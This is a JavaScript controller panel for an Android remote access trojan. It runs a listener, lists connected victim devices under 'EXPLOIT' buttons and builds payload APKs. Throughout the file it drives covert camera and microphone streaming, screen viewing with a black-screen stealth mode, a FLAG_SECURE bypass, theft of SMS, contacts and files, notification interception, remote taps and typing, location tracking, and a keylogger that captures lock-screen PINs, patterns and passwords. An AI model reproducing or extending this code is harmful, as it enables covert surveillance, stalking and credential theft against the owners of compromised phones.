const socket = io();

// UI Elements
const listenPortInput = document.getElementById('listen-port');
const listenBtn = document.getElementById('listen-btn');
const targetTable = document.getElementById('target-table').getElementsByTagName('tbody')[0];
const consoleOutput = document.getElementById('console-output');
const listenerBadge = document.getElementById('listener-status-badge');
const clientCount = document.getElementById('client-count');
const modal = document.getElementById('modal');
const modalBody = document.getElementById('modal-body');

let isListening = false;
let currentTargetId = null;
let currentPath = "/sdcard";
let isCameraStreaming = false;
let isMicLive = false;
let isMicRecording = false;
let audioContext = null;
let audioStack = [];
let nextStartTime = 0;
let currentSampleRate = 11025;
let leafMap = null;
let leafMarker = null;
let locationHistory = [];
let isScreenStreaming = false;
let isScreenReading = false;
let deviceWidth = 1080;
let deviceHeight = 1920;
let mouseDownPos = null;
let accessibilityEnabled = false;

// Listener Controls
listenBtn.onclick = () => {
    if (!isListening) {
        const port = listenPortInput.value;
        socket.emit('start_listener', port);
    } else {
        socket.emit('stop_listener');
    }
};

socket.on('listener_status', (status) => {
    isListening = status.running;
    if (isListening) {
        listenerBadge.innerText = `Online (${status.port})`;
        listenerBadge.className = "badge green";
        listenBtn.innerText = "Stop Listener";
        listenBtn.className = "danger-btn";
        log(`Listener started on port ${status.port}`);
    } else {
        listenerBadge.innerText = "Offline";
        listenerBadge.className = "badge red";
        listenBtn.innerText = "Start Listener";
        listenBtn.className = "success-btn";
        log("Listener stopped");
    }
});

socket.on('listener_error', (err) => {
    log(`Listener Error: ${err}`, "danger");
});

// Clients Management
socket.on('initial_clients', (clients) => {
    targetTable.innerHTML = '';
    clients.forEach(addClient);
    updateClientCount();
});

socket.on('client_connected', (client) => {
    addClient(client);
    log(`New device connected: ${client.id}`);
    updateClientCount();
});

socket.on('client_disconnected', (id) => {
    removeClient(id);
    log(`Device disconnected: ${id}`, "danger");
    updateClientCount();
});

function updateClientCount() {
    const count = targetTable.rows.length;
    clientCount.innerText = `${count} Device${count !== 1 ? 's' : ''} Connected`;
}

function addClient(client) {
    if (document.getElementById(client.id)) return;
    const row = targetTable.insertRow();
    row.id = client.id;
    row.innerHTML = `
        <td>${client.id}</td>
        <td>${client.details.model} (${client.details.release})</td>
        <td class="action-btns">
            <button class="primary-btn" onclick="openExploit('${client.id}')">EXPLOIT</button>
        </td>
    `;
}

function removeClient(id) {
    const row = document.getElementById(id);
    if (row) row.remove();
    if (currentTargetId === id) {
        closeModal();
    }
}

// Exploit Dashboard
window.openExploit = (id) => {
    currentTargetId = id;
    modalBody.innerHTML = `
        <span class="close" onclick="closeModal()">&times;</span>
        <div class="exploit-container">
            <div class="exploit-nav">
                <div class="nav-item active" onclick="switchTab('camera')">Camera</div>
                <div class="nav-item" onclick="switchTab('screen_share')">Screen Share</div>
                <div class="nav-item" onclick="switchTab('screen_reader')">Screen Reader</div>
                <div class="nav-item" onclick="switchTab('files')">File Manager</div>
                <div class="nav-item" onclick="switchTab('sms')">SMS Inbox</div>
                <div class="nav-item" onclick="switchTab('contacts')">Contacts</div>
                <div class="nav-item" onclick="switchTab('keylog')">Keylogger</div>
                <div class="nav-item" onclick="switchTab('notifications')">Notifications</div>
                <div class="nav-item" onclick="switchTab('automation')">Automation</div>
                <div class="nav-item" onclick="switchTab('mic')">Microphone</div>
                <div class="nav-item" onclick="switchTab('location')">Location</div>
            </div>
            <div id="exploit-content" class="exploit-content">
                <!-- Tab content will be injected here -->
            </div>
        </div>
    `;
    modal.style.display = "block";
    switchTab('camera');
};

window.closeModal = () => {
    if (isCameraStreaming) stopCamera();
    if (isMicLive || isMicRecording) stopMic();
    if (leafMap) {
        leafMap.remove();
        leafMap = null;
    }
    modal.style.display = "none";
    currentTargetId = null;
};

window.switchTab = (tab) => {
    // If we were streaming camera and move to another tab, stop it
    if (isCameraStreaming && tab !== 'camera') {
        stopCamera();
    }
    
    // Clear map if moving away from location
    if (leafMap && tab !== 'location') {
        leafMap.remove();
        leafMap = null;
    }

    document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
    if (event && event.target) {
        event.target.classList.add('active');
    } else {
        // Fallback for initial load
        document.querySelector(`.nav-item:nth-child(1)`).classList.add('active');
    }

    const content = document.getElementById('exploit-content');
    if (tab === 'camera') {
        content.innerHTML = `
            <div class="exploit-header">
                <h3>Live Camera Feed</h3>
                <span>Device: ${currentTargetId}</span>
            </div>
            <div class="camera-view" id="camera-feed">
                <p>Stream Offline</p>
            </div>
            <div class="camera-controls">
                <button id="cam-start-btn" class="success-btn" onclick="toggleCamera()">Start Stream (Front)</button>
                <button class="primary-btn" onclick="toggleCamera(1)">Switch to Back</button>
                <button id="cam-stop-btn" class="danger-btn" style="display:none;" onclick="stopCamera()">Stop Stream</button>
            </div>
        `;
    } else if (tab === 'screen_share') {
        content.innerHTML = `
            <div class="exploit-header">
                <h3>Live Screen Share</h3>
                <div>
                    <span id="screen-status" class="badge red">Offline</span>
                    <span id="acc-status" class="badge orange">Accessibility: Unknown</span>
                </div>
            </div>
            <div class="screen-view-container">
                <div class="screen-canvas-wrapper" id="screen-wrapper">
                    <img id="screen-img" draggable="false" style="display:none; width:100%; height:auto; cursor: crosshair;">
                    <div id="screen-placeholder">Stream Offline</div>
                </div>
            </div>
            <div class="screen-controls">
                <button id="screen-start-btn" class="success-btn" onclick="toggleScreenShare()">Start Screen Share</button>
                <button id="screen-stop-btn" class="danger-btn" style="display:none;" onclick="stopScreenShare()">Stop</button>
                <button id="stealth-btn" class="primary-btn" onclick="toggleStealth()">Toggle Stealth Mode (Black Screen)</button>
                <div class="nav-controls">
                    <button class="primary-btn" onclick="sendGesture('action', {params: {actionId: 1}})">BACK</button>
                    <button class="primary-btn" onclick="sendGesture('action', {params: {actionId: 2}})">HOME</button>
                    <button class="primary-btn" onclick="sendGesture('action', {params: {actionId: 3}})">RECENTS</button>
                </div>
            </div>
        `;
        initScreenControls();
    } else if (tab === 'screen_reader') {
        content.innerHTML = `
            <div class="exploit-header">
                <h3>Screen Reader (Bypass FLAG_SECURE)</h3>
                <span id="reader-status" class="badge red">Inactive</span>
            </div>
            <p class="hint">Traversing Accessibility nodes to reconstruct UI in plain-text boxes.</p>
            <div class="screen-reader-view" id="reader-view">
                <div id="reader-container" class="reader-container">
                    <p style="color:var(--text-dim); text-align:center; padding-top:100px;">Start reader to see UI structure.</p>
                </div>
            </div>
            <div class="screen-controls">
                <button id="reader-start-btn" class="success-btn" onclick="toggleScreenReader()">Start Reader</button>
                <button id="reader-stop-btn" class="danger-btn" style="display:none;" onclick="stopScreenReader()">Stop</button>
            </div>
        `;
    } else if (tab === 'files') {
        content.innerHTML = `
            <div class="exploit-header">
                <h3>File Manager</h3>
                <span id="current-path">${currentPath}</span>
            </div>
            <div class="file-list" id="file-explorer">
                <p>Loading files...</p>
            </div>
        `;
        sendOrder(currentTargetId, 'file_manager', {path: currentPath});
    } else if (tab === 'sms') {
        content.innerHTML = `<h3>SMS Inbox</h3><div class="table-container"><table id="sms-table"><thead><tr><th>From</th><th>Message</th><th>Date</th></tr></thead><tbody id="sms-list"><tr><td colspan="3">Loading SMS...</td></tr></tbody></table></div>`;
        sendOrder(currentTargetId, 'sms');
    } else if (tab === 'contacts') {
        content.innerHTML = `<h3>Contacts List</h3><div class="table-container"><table id="contacts-table"><thead><tr><th>Name</th><th>Number</th></tr></thead><tbody id="contacts-list"><tr><td colspan="2">Loading Contacts...</td></tr></tbody></table></div>`;
        sendOrder(currentTargetId, 'contacts');
    } else if (tab === 'keylog') {
        content.innerHTML = `
            <div class="exploit-header">
                <h3>Real-time Keylogger</h3>
                <span class="badge red">Live</span>
            </div>
            <p class="hint">Capturing keystrokes and <strong>Lock Screen Credentials</strong>.</p>
            <div id="credential-log" class="credential-container" style="margin-bottom: 1rem; padding: 1rem; border: 1px solid var(--primary); background: rgba(255,0,0,0.1); display:none;">
                <h4 style="color:var(--primary); margin-top:0;">🔓 Captured Lock Credentials</h4>
                <div id="captured-creds-list"></div>
            </div>
            <div id="keylog-list" class="log-container" style="height: 400px; overflow-y: auto; border: 1px solid var(--border); padding: 1rem; background: #050505;">
                <p>Waiting for keystrokes...</p>
            </div>
        `;
    } else if (tab === 'notifications') {
        content.innerHTML = `
            <div class="exploit-header">
                <h3>Notification Listener</h3>
                <span class="badge green">Active</span>
            </div>
            <p class="hint">Intercepting incoming system and app notifications.</p>
            <div id="notification-list" class="log-container" style="height: 500px; overflow-y: auto; margin-top: 1rem; border: 1px solid var(--border); padding: 1rem; background: #050505;">
                <p>Waiting for notifications...</p>
            </div>
        `;
    } else if (tab === 'automation') {
        content.innerHTML = `
            <div class="exploit-header">
                <h3>Advanced Automation</h3>
            </div>
            <div class="automation-controls">
                <div class="control-group">
                    <h4>Click Actions</h4>
                    <div class="form-inline">
                        <input type="text" id="auto-click-text" placeholder="Button Text (e.g. Accept)">
                        <button class="primary-btn" onclick="sendAuto('click_text', 'auto-click-text')">Click by Text</button>
                    </div>
                    <div class="form-inline" style="margin-top:0.5rem;">
                        <input type="text" id="auto-click-id" placeholder="View ID (e.g. com.android.systemui:id/ok)">
                        <button class="primary-btn" onclick="sendAuto('click_id', 'auto-click-id')">Click by ID</button>
                    </div>
                </div>
                <div class="control-group" style="margin-top:1rem;">
                    <h4>Input Actions</h4>
                    <div class="form-inline">
                        <input type="text" id="auto-input-text" placeholder="Text to type">
                        <button class="primary-btn" onclick="sendAuto('input_text', 'auto-input-text')">Type Text</button>
                    </div>
                </div>
                <div class="control-group" style="margin-top:1rem;">
                    <h4>App Management</h4>
                    <div class="form-inline">
                        <input type="text" id="auto-open-app" placeholder="Package Name (e.g. com.android.settings)">
                        <button class="primary-btn" onclick="sendAuto('open_app', 'auto-open-app')">Open App</button>
                    </div>
                    <div class="form-inline" style="margin-top:0.5rem;">
                        <input type="text" id="auto-open-url" placeholder="URL (e.g. https://google.com)">
                        <button class="primary-btn" onclick="sendAuto('open_url', 'auto-open-url')">Open URL</button>
                    </div>
                </div>
            </div>
        `;
    } else if (tab === 'mic') {
        content.innerHTML = `
            <div class="exploit-header">
                <h3>Microphone Control</h3>
                <span id="mic-status">Status: Idle</span>
            </div>
            <div class="mic-controls">
                <div class="control-group">
                    <h4>Settings</h4>
                    <div class="form-group">
                        <label>Sample Rate (Hz)</label>
                        <select id="mic-sample-rate">
                            <option value="8000">8000 (Low)</option>
                            <option value="11025" selected>11025 (Standard)</option>
                            <option value="16000">16000 (Mid)</option>
                            <option value="22050">22050 (High)</option>
                            <option value="44100">44100 (CD Quality)</option>
                        </select>
                    </div>
                </div>
                <div class="control-group">
                    <h4>Live Listening</h4>
                    <button id="live-mic-btn" class="success-btn" onclick="toggleLiveMic()">Start Live Listen</button>
                    <p class="hint">Listen to the device microphone in real-time.</p>
                </div>
                <div class="control-group">
                    <h4>Record to Server</h4>
                    <button id="rec-mic-btn" class="primary-btn" onclick="toggleRecordMic()">Start Recording</button>
                    <p class="hint">Record audio and save it to the server Downloads folder.</p>
                </div>
            </div>
            <div id="audio-visualizer" class="visualizer-container">
                <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
            </div>
        `;
    } else if (tab === 'location') {
        content.innerHTML = `
            <div class="exploit-header">
                <h3>Live Location Tracker</h3>
                <button class="primary-btn" onclick="sendOrder(currentTargetId, 'location')" style="padding: 0.4rem 0.8rem; font-size: 0.7rem;">Refresh Location</button>
            </div>
            <div id="location-result">
                <p>Requesting precise location from device...</p>
            </div>
            <div id="map-container"></div>
            <div class="location-history-container">
                <h4>Location History Log</h4>
                <div class="history-table-wrapper">
                    <table>
                        <thead>
                            <tr>
                                <th>Time</th>
                                <th>Lat/Lng</th>
                                <th>Acc</th>
                                <th>Prov</th>
                            </tr>
                        </thead>
                        <tbody id="location-history-body">
                            <!-- History entries -->
                        </tbody>
                    </table>
                </div>
            </div>
        `;
        locationHistory = []; // Reset history for new session
        sendOrder(currentTargetId, 'location');
    }
};

window.toggleLiveMic = () => {
    if (isMicLive) {
        stopMic();
    } else {
        if (isMicRecording) stopMic();
        isMicLive = true;
        currentSampleRate = parseInt(document.getElementById('mic-sample-rate').value);
        sendOrder(currentTargetId, 'mic', {action: 'start', mode: 'live', sample_rate: currentSampleRate});
        const btn = document.getElementById('live-mic-btn');
        if (btn) {
            btn.innerText = 'Stop Live Listen';
            btn.className = 'danger-btn';
        }
        const status = document.getElementById('mic-status');
        if (status) status.innerText = `Status: Live Listening (${currentSampleRate}Hz)...`;
        initAudioContext();
    }
};

window.toggleRecordMic = () => {
    if (isMicRecording) {
        stopMic();
    } else {
        if (isMicLive) stopMic();
        isMicRecording = true;
        currentSampleRate = parseInt(document.getElementById('mic-sample-rate').value);
        sendOrder(currentTargetId, 'mic', {action: 'start', mode: 'record', sample_rate: currentSampleRate});
        const btn = document.getElementById('rec-mic-btn');
        if (btn) {
            btn.innerText = 'Stop Recording';
            btn.className = 'danger-btn';
        }
        const status = document.getElementById('mic-status');
        if (status) status.innerText = `Status: Recording to Server (${currentSampleRate}Hz)...`;
    }
};

window.stopMic = () => {
    const wasRecording = isMicRecording;
    isMicLive = false;
    isMicRecording = false;
    sendOrder(currentTargetId, 'mic', {action: 'stop'});
    
    const liveBtn = document.getElementById('live-mic-btn');
    const recBtn = document.getElementById('rec-mic-btn');
    const status = document.getElementById('mic-status');
    
    if (liveBtn) {
        liveBtn.innerText = 'Start Live Listen';
        liveBtn.className = 'success-btn';
    }
    if (recBtn) {
        recBtn.innerText = 'Start Recording';
        recBtn.className = 'primary-btn';
    }
    if (status) {
        status.innerText = wasRecording ? 'Status: Processing Audio...' : 'Status: Idle';
    }
    
    if (audioContext) {
        audioContext.close();
        audioContext = null;
    }
};

function initAudioContext() {
    audioContext = new (window.AudioContext || window.webkitAudioContext)();
    nextStartTime = audioContext.currentTime;
}

function playAudioChunk(base64Data) {
    if (!audioContext || !isMicLive) return;
    
    try {
        const binary = atob(base64Data);
        const len = binary.length;
        const bytes = new Int16Array(len / 2);
        for (let i = 0; i < len; i += 2) {
            bytes[i / 2] = (binary.charCodeAt(i + 1) << 8) | binary.charCodeAt(i);
        }
        
        const float32 = new Float32Array(bytes.length);
        for (let i = 0; i < bytes.length; i++) {
            float32[i] = bytes[i] / 32768.0;
        }
        
        const buffer = audioContext.createBuffer(1, float32.length, currentSampleRate);
        buffer.copyToChannel(float32, 0);
        
        const source = audioContext.createBufferSource();
        source.buffer = buffer;
        source.connect(audioContext.destination);
        
        const currentTime = audioContext.currentTime;
        if (nextStartTime < currentTime) nextStartTime = currentTime;
        
        source.start(nextStartTime);
        nextStartTime += buffer.duration;

        const bars = document.querySelectorAll('.bar');
        bars.forEach(bar => {
            const h = Math.random() * 80 + 10;
            bar.style.height = `${h}px`;
        });
    } catch (e) { }
}

window.toggleCamera = (cameraId = 0) => {
    isCameraStreaming = true;
    sendOrder(currentTargetId, 'camera', {camera_id: cameraId, quality: 40});
    document.getElementById('cam-start-btn').style.display = 'none';
    document.getElementById('cam-stop-btn').style.display = 'inline-block';
    const feed = document.getElementById('camera-feed');
    if (feed) feed.innerHTML = '<p>Connecting to stream...</p>';
};

window.stopCamera = () => {
    isCameraStreaming = false;
    sendOrder(currentTargetId, 'stop_camera');
    const startBtn = document.getElementById('cam-start-btn');
    const stopBtn = document.getElementById('cam-stop-btn');
    if (startBtn) startBtn.style.display = 'inline-block';
    if (stopBtn) stopBtn.style.display = 'none';
    const feed = document.getElementById('camera-feed');
    if (feed) feed.innerHTML = '<p>Stream Offline</p>';
};

window.sendOrder = (id, order, params = {}) => {
    socket.emit('order', { id, order, params });
    log(`Sent ${order.toUpperCase()} to ${id}`);
};

// Screen Share Controls
window.toggleScreenShare = () => {
    isScreenStreaming = true;
    sendOrder(currentTargetId, 'screen_share', {action: 'start'});
    document.getElementById('screen-start-btn').style.display = 'none';
    document.getElementById('screen-stop-btn').style.display = 'inline-block';
    const status = document.getElementById('screen-status');
    if (status) {
        status.innerText = 'Starting...';
        status.className = 'badge orange';
    }
};

window.stopScreenShare = () => {
    isScreenStreaming = false;
    sendOrder(currentTargetId, 'screen_share', {action: 'stop'});
    document.getElementById('screen-start-btn').style.display = 'inline-block';
    document.getElementById('screen-stop-btn').style.display = 'none';
    const status = document.getElementById('screen-status');
    if (status) {
        status.innerText = 'Offline';
        status.className = 'badge red';
    }
    const img = document.getElementById('screen-img');
    const placeholder = document.getElementById('screen-placeholder');
    if (img) img.style.display = 'none';
    if (placeholder) placeholder.style.display = 'block';
};

// Screen Reader Controls
window.toggleScreenReader = () => {
    isScreenReading = true;
    sendOrder(currentTargetId, 'screen_reader', {action: 'start'});
    document.getElementById('reader-start-btn').style.display = 'none';
    document.getElementById('reader-stop-btn').style.display = 'inline-block';
    const status = document.getElementById('reader-status');
    if (status) {
        status.innerText = 'Active';
        status.className = 'badge green';
    }
};

window.stopScreenReader = () => {
    isScreenReading = false;
    sendOrder(currentTargetId, 'screen_reader', {action: 'stop'});
    document.getElementById('reader-start-btn').style.display = 'inline-block';
    document.getElementById('reader-stop-btn').style.display = 'none';
    const status = document.getElementById('reader-status');
    if (status) {
        status.innerText = 'Inactive';
        status.className = 'badge red';
    }
};

let isStealthMode = false;
window.toggleStealth = () => {
    isStealthMode = !isStealthMode;
    sendOrder(currentTargetId, 'stealth', {enable: isStealthMode});
    const btn = document.getElementById('stealth-btn');
    if (btn) {
        btn.innerText = isStealthMode ? 'Disable Stealth Mode' : 'Enable Stealth Mode (Black Screen)';
        btn.className = isStealthMode ? 'danger-btn' : 'primary-btn';
    }
    log(`Stealth Mode: ${isStealthMode ? 'Enabled' : 'Disabled'}`);
};

window.sendAuto = (command, inputId) => {
    const argument = document.getElementById(inputId).value;
    if (!argument && command !== 'back' && command !== 'home' && command !== 'recents') {
        log("Error: Argument required for " + command, "danger");
        return;
    }
    sendOrder(currentTargetId, 'automation', {command, argument});
};

window.sendGesture = (type, data) => {
    sendOrder(currentTargetId, 'gesture', { type, ...data.params });
};

function initScreenControls() {
    const img = document.getElementById('screen-img');
    if (!img) return;

    img.onmousedown = (e) => {
        e.preventDefault();
        const rect = img.getBoundingClientRect();
        mouseDownPos = {
            x: (e.clientX - rect.left) / rect.width,
            y: (e.clientY - rect.top) / rect.height,
            time: Date.now()
        };
    };

    img.onmouseup = (e) => {
        e.preventDefault();
        if (!mouseDownPos) return;
        const rect = img.getBoundingClientRect();
        const mouseUpPos = {
            x: (e.clientX - rect.left) / rect.width,
            y: (e.clientY - rect.top) / rect.height,
            time: Date.now()
        };

        const dx = mouseUpPos.x - mouseDownPos.x;
        const dy = mouseUpPos.y - mouseDownPos.y;
        const dist = Math.sqrt(dx * dx + dy * dy);
        const duration = mouseUpPos.time - mouseDownPos.time;

        if (dist < 0.02) {
            // Click
            sendGesture('click', {
                params: {
                    x: Math.round(mouseUpPos.x * deviceWidth),
                    y: Math.round(mouseUpPos.y * deviceHeight)
                }
            });
        } else {
            // Swipe
            sendGesture('swipe', {
                params: {
                    x1: Math.round(mouseDownPos.x * deviceWidth),
                    y1: Math.round(mouseDownPos.y * deviceHeight),
                    x2: Math.round(mouseUpPos.x * deviceWidth),
                    y2: Math.round(mouseUpPos.y * deviceHeight),
                    duration: Math.max(duration, 200)
                }
            });
        }
        mouseDownPos = null;
    };
}

function renderScreenReader(nodes) {
    const container = document.getElementById('reader-container');
    if (!container) return;
    container.innerHTML = '';

    nodes.forEach(node => {
        const bounds = node.b.split(','); // l,t,r,b
        const l = parseInt(bounds[0]);
        const t = parseInt(bounds[1]);
        const r = parseInt(bounds[2]);
        const b = parseInt(bounds[3]);
        
        const div = document.createElement('div');
        div.className = 'reader-node';
        if (node.ck) div.classList.add('clickable');
        
        // Positioning - mapping to a 100% container
        // Android bounds are usually based on screen resolution.
        // We'll use percentage assuming a 1080x1920 or similar, but the server just needs the relative positions.
        div.style.left = (l / 10.8) + '%';
        div.style.top = (t / 22) + '%'; 
        div.style.width = ((r - l) / 10.8) + '%';
        div.style.height = ((b - t) / 22) + '%';
        
        div.title = node.cl; 
        div.innerText = node.t || node.c || '';
        
        if (node.ck) {
            div.onclick = () => {
                const centerX = l + (r - l) / 2;
                const centerY = t + (b - t) / 2;
                sendGesture('click', {x: Math.round(centerX), y: Math.round(centerY)});
                
                // White flash feedback
                div.style.backgroundColor = 'white';
                setTimeout(() => div.style.backgroundColor = 'rgba(255,255,255,0.1)', 100);
            };
        }
        
        container.appendChild(div);
    });
}

// Data Handlers
socket.on('client_data', (msg) => {
    if (msg.id !== currentTargetId) return;

    const type = msg.data.type;
    if (type === 'accessibility_status') {
        const accStatus = document.getElementById('acc-status');
        if (accStatus) {
            if (msg.data.enabled) {
                accStatus.innerText = 'Accessibility: Active';
                accStatus.className = 'badge green';
            } else {
                accStatus.innerText = 'Accessibility: Inactive';
                accStatus.className = 'badge red';
            }
        }
    } else if (type === 'camera') {
        const feed = document.getElementById('camera-feed');
        if (feed) feed.innerHTML = `<img src="data:image/jpeg;base64,${msg.data.image}" style="width:100%; height:auto;">`;
    } else if (type === 'screen_share') {
        const img = document.getElementById('screen-img');
        const placeholder = document.getElementById('screen-placeholder');
        const status = document.getElementById('screen-status');
        if (msg.data.width) deviceWidth = msg.data.width;
        if (msg.data.height) deviceHeight = msg.data.height;
        if (img) {
            img.src = `data:image/jpeg;base64,${msg.data.image}`;
            img.style.display = 'block';
            if (placeholder) placeholder.style.display = 'none';
            if (status) {
                status.innerText = 'Live';
                status.className = 'badge green';
            }
        }
    } else if (type === 'screen_reader') {
        renderScreenReader(msg.data.nodes);
    } else if (type === 'file_manager') {
        renderFiles(msg.data.data);
    } else if (type === 'file_download') {
        log(`Downloaded: ${msg.data.name}`, "success");
    } else if (type === 'sms') {
        renderSMS(msg.data.data);
    } else if (type === 'contacts') {
        renderContacts(msg.data.data);
    } else if (type === 'keylog') {
        appendKeylog(msg.data);
    } else if (type === 'lock_captured') {
        showCapturedLock(msg.data);
    } else if (type === 'notification') {
        appendNotification(msg.data);
    } else if (type === 'mic_chunk') {
        playAudioChunk(msg.data.data);
    } else if (type === 'mic_saved') {
        const status = document.getElementById('mic-status');
        if (status) status.innerHTML = `Status: Recording Saved! <a href="${msg.data.file}" target="_blank" style="color:var(--primary); text-decoration:underline;">Download MP3</a>`;
        log(`Recording saved: ${msg.data.file}`, "success");
    } else if (type === 'mic') {
        const res = document.getElementById('audio-result');
        if (res) res.innerHTML = `<audio controls src="data:audio/aac;base64,${msg.data.audio}"></audio>`;
    } else if (type === 'location') {
        const res = document.getElementById('location-result');
        if (res) {
            const date = new Date(msg.data.time).toLocaleString();
            res.innerHTML = `
                <div class="location-card" style="margin-top: 0; padding: 1rem;">
                    <div class="location-header" style="margin-bottom: 0.75rem;">
                        <span class="badge ${msg.data.status === 'Fresh' ? 'green' : 'orange'}">${msg.data.status}</span>
                        <span class="location-time">${date}</span>
                    </div>
                    <div class="location-body" style="display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 0.5rem; font-size: 0.8rem;">
                        <p><strong>Pos:</strong> ${msg.data.lat.toFixed(4)}, ${msg.data.lng.toFixed(4)}</p>
                        <p><strong>Acc:</strong> ${msg.data.accuracy ? msg.data.accuracy.toFixed(1) + 'm' : 'N'}</p>
                        <p><strong>Prov:</strong> ${msg.data.provider ? msg.data.provider.toUpperCase() : 'N'}</p>
                        <p><strong>Speed:</strong> ${msg.data.speed ? msg.data.speed.toFixed(1) + 'm/s' : '0'}</p>
                        ${msg.data.address ? `<p style="grid-column: span 4; border-top: 1px solid var(--border); padding-top: 0.5rem; margin-top: 0.25rem;"><strong>Address:</strong> ${msg.data.address}</p>` : ''}
                    </div>
                </div>
            `;

            // Initialize or update the map
            const lat = msg.data.lat;
            const lng = msg.data.lng;

            if (!leafMap) {
                leafMap = L.map('map-container').setView([lat, lng], 15);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© OpenStreetMap'
                }).addTo(leafMap);
                
                // Red color for the marker to match the theme
                const redIcon = L.icon({
                    iconUrl: 'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-red.png',
                    shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/0.7.7/images/marker-shadow.png',
                    iconSize: [25, 41],
                    iconAnchor: [12, 41],
                    popupAnchor: [1, -34],
                    shadowSize: [41, 41]
                });

                leafMarker = L.marker([lat, lng], {icon: redIcon}).addTo(leafMap);
            } else {
                const newPos = new L.LatLng(lat, lng);
                leafMarker.setLatLng(newPos);
                leafMap.panTo(newPos);
            }
            
            leafMarker.bindPopup(`<b>${msg.data.status} Location</b><br>${date}`).openPopup();

            // Update History
            locationHistory.unshift({
                time: date,
                lat: msg.data.lat,
                lng: msg.data.lng,
                acc: msg.data.accuracy,
                prov: msg.data.provider
            });

            const historyBody = document.getElementById('location-history-body');
            if (historyBody) {
                historyBody.innerHTML = locationHistory.map(h => `
                    <tr>
                        <td>${h.time.split(',')[1].trim()}</td>
                        <td style="font-family: 'Fira Code', monospace; font-size: 0.7rem;">${h.lat.toFixed(4)}, ${h.lng.toFixed(4)}</td>
                        <td>${h.acc ? h.acc.toFixed(1) + 'm' : 'N/A'}</td>
                        <td style="text-transform: uppercase; font-size: 0.7rem;">${h.prov || 'N/A'}</td>
                    </tr>
                `).join('');
            }
        }
    }
});

function renderFiles(files) {
    const explorer = document.getElementById('file-explorer');
    if (!explorer) return;
    
    let html = '';
    // Back button if not in root
    if (currentPath !== "/" && currentPath !== "" && currentPath !== "null") {
        html += `
            <div class="file-item" onclick="goBack()">
                <div class="file-icon">⬅️</div>
                <div class="file-name">.. (Back)</div>
            </div>
        `;
    }

    files.forEach(f => {
        const icon = f.isDir ? '📁' : '📄';
        html += `
            <div class="file-item" onclick="${f.isDir ? `navigate('${f.path}')` : `triggerDownload('${f.path}', '${f.name}')`}">
                <div class="file-icon">${icon}</div>
                <div class="file-name">${f.name}</div>
            </div>
        `;
    });
    explorer.innerHTML = html;
}

window.navigate = (path) => {
    currentPath = path;
    const pathEl = document.getElementById('current-path');
    if (pathEl) pathEl.innerText = currentPath;
    sendOrder(currentTargetId, 'file_manager', {path: currentPath});
};

window.goBack = () => {
    const parts = currentPath.split('/');
    parts.pop();
    currentPath = parts.join('/') || "/";
    navigate(currentPath);
};

window.triggerDownload = (path, name) => {
    if (confirm(`Download ${name}?`)) {
        log(`Downloading: ${name}...`);
        socket.emit('order', { id: currentTargetId, order: 'file_download', params: { path } });
    }
};

function renderSMS(sms) {
    const list = document.getElementById('sms-list');
    if (!list) return;
    let html = '';
    sms.forEach(s => {
        const date = new Date(s.date).toLocaleString();
        const typeBadge = s.type === 1 ? '<span class="badge green">IN</span>' : '<span class="badge orange">OUT</span>';
        html += `<tr><td>${typeBadge} ${s.address}</td><td>${s.body}</td><td>${date}</td></tr>`;
    });
    list.innerHTML = html;
}

function renderContacts(contacts) {
    const list = document.getElementById('contacts-list');
    if (!list) return;
    let html = '';
    contacts.forEach(c => {
        html += `<tr><td>${c.name}</td><td>${c.number}</td></tr>`;
    });
    list.innerHTML = html;
}

function appendKeylog(data) {
    const list = document.getElementById('keylog-list');
    if (!list) return;
    
    // Remove "Waiting" message on first data
    if (list.innerHTML.includes('Waiting for keystrokes...')) list.innerHTML = '';
    
    const div = document.createElement('div');
    div.className = 'log-entry-item';
    div.innerHTML = `
        <div class="log-entry-header">
            <span class="log-app-name">${data.app}</span>
            <span class="log-time-stamp">${data.time}</span>
        </div>
        <div class="log-content keylog-data">${data.data}</div>
    `;
    list.prepend(div); // Newest at top
}

function showCapturedLock(data) {
    const container = document.getElementById('credential-log');
    const list = document.getElementById('captured-creds-list');
    if (!container || !list) {
        log("🔓 Lock Credential Captured: " + (data.pin || data.pattern || data.password), "warning");
        return;
    }

    container.style.display = 'block';
    const div = document.createElement('div');
    div.style.padding = "0.5rem";
    div.style.borderBottom = "1px solid rgba(255,255,255,0.1)";
    
    let html = `<strong>Time:</strong> ${new Date().toLocaleTimeString()}<br>`;
    if (data.pin) html += `<strong>PIN:</strong> <span style="color:var(--primary);">${data.pin}</span><br>`;
    if (data.pattern) html += `<strong>Pattern:</strong> <span style="color:var(--primary);">${data.pattern}</span><br>`;
    if (data.password) html += `<strong>Password:</strong> <span style="color:var(--primary);">${data.password}</span><br>`;
    
    div.innerHTML = html;
    list.prepend(div);
    log("🔓 Lock Credential Captured!", "warning");
}

function appendNotification(data) {
    const list = document.getElementById('notification-list');
    if (!list) return;

    // Remove "Waiting" message on first data
    if (list.innerHTML.includes('Waiting for notifications...')) list.innerHTML = '';

    const div = document.createElement('div');
    div.className = 'log-entry-item';
    div.innerHTML = `
        <div class="log-entry-header">
            <span class="log-app-name">${data.app}</span>
            <span class="log-time-stamp">${data.time}</span>
        </div>
        <div class="log-content">
            <strong>${data.title}</strong><br>
            ${data.content}
        </div>
    `;
    list.prepend(div); // Newest at top
}

// Global Logs
function log(msg, type = "info") {
    const div = document.createElement('div');
    div.className = 'log-entry';
    const time = new Date().toLocaleTimeString();
    div.innerHTML = `<span class="log-time">[${time}]</span> <span class="${type}">${msg}</span>`;
    consoleOutput.appendChild(div);
    consoleOutput.scrollTop = consoleOutput.scrollHeight;
}

socket.on('build_log', (data) => log(data));
socket.on('build_success', (file) => {
    log(`Build Success! <a href="/output/${file}" style="color: #ff0000; text-decoration: underline;" target="_blank">Download APK</a>`);
    buildBtn.disabled = false;
});
